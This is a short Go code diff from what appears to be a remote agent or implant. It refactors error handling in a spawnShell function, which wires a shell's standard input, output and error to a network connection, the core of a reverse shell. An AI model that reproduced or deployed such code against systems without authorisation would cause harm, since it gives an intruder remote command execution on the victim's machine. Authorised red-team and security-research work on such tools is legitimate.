@@ -106,8 +106,7 @@ func spawnShell(target string, agent *util.AgentConfig) (string, int, int) {
 	shell.Stdout = conn
 	shell.Stdin = conn
 	shell.Stderr = conn
-	err := shell.Start()
-	if err != nil {
+	if err := shell.Start(); err != nil {
 		return "Error spawning shell", -1, agent.Pid
 	}
 	return "Shell spawned successfully", 0, shell.Process.Pid
